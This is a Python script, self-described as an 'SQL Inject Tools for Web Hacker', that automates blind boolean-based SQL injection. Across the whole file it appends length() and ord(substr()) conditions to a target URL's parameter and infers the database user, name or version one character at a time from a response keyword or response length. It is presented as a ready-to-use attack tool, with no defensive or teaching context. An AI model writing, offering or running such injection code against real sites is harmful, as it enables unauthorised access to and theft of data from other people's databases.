# SQL Inject Tools for Web Hacker . 
# Author : bey0nd 
import urllib
import urllib
import sys
import string

#response length
retLength = 0 
#response keyword
retKeyword = ''
#what data you want to inject
getDataType = ''
#inject url
url = ''
#data length for example . length(user())  
dataLength = 0
#inject result
result = ''
payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

#get data length. such as database()  or user()
def getlength():
    global retLength
    retLength = len(urllib.urlopen(url.replace("*","")).read())

def getDataLength():
    global dataLength
    for i in range(1,30):
        murl = url
        exp = " and length(%s)=%s" % (getDataType,i)
        targeturl =  murl.replace("*",exp)
        html = urllib.urlopen(targeturl).read()
        if retKeyword!='':
            if html.find(retKeyword)!=-1:
                dataLength = i + 1
                break
        else:
            #this way , get data by response length 
            getlength()
            if len(html)==retLength:
                dataLength = i + 1
                break
    print("Init %s Length Success  %s" % (getDataType,dataLength-1))

              



#inject method , get data with this method
def inject():
    global payloads
    global dataLength
    global result
    global retLength
    global getDataType
    global url
    
    for count in range(1,dataLength):
        for payload in payloads:
            # init url param
            murl = url
            exp = " and ord(substr(%s,%s,1))=%s" % (getDataType,count,ord(payload))
            targeturl =  murl.replace("*",exp)
            #print(targeturl)
            
            html = urllib.urlopen(targeturl).read()
            #one way , get data by response keyword
            if retKeyword!='':
                if html.find(retKeyword)!=-1:
                    result+=payload
                    break
            else:
            	#this way , get data by response length 
            	getlength()
                if len(html)==retLength:
                    result+=payload
                    break
              
        print("[-] DB Info : %s" % result)
           
    print('-----------------------------')
    print("[+] Done ! DB Info is :%s" % result)
    print("\n")           
            
            
                
            





def initParam():
    global getDataType
    global retKeyword
    global url
    global dataLength
    if '-keyword' in sys.argv:
        retKeyword = sys.argv[sys.argv.index('-keyword')+1]
    if '-url' in sys.argv:
        url = sys.argv[sys.argv.index('-url')+1]
    if '-len' in sys.argv:
        alen = int(sys.argv[sys.argv.index('-len')+1])
        dataLength = alen + 1
    if '--user' in sys.argv:
        getDataType = "user()"
    if '--dbs' in sys.argv:
        getDataType = "database()"
    if '--ver' in sys.argv:
        getDataType = "version()"
    

if __name__ == "__main__":

	
	#print(len(sys.argv))
    initParam()
    getDataLength()
    print("Init Param Success Check your data with output")
    #print("key %s  \ndata %s \nurl is %s \nlen  is %s" % (retKeyword,getDataType,url,dataLength))
    inject()
    
    
    
    
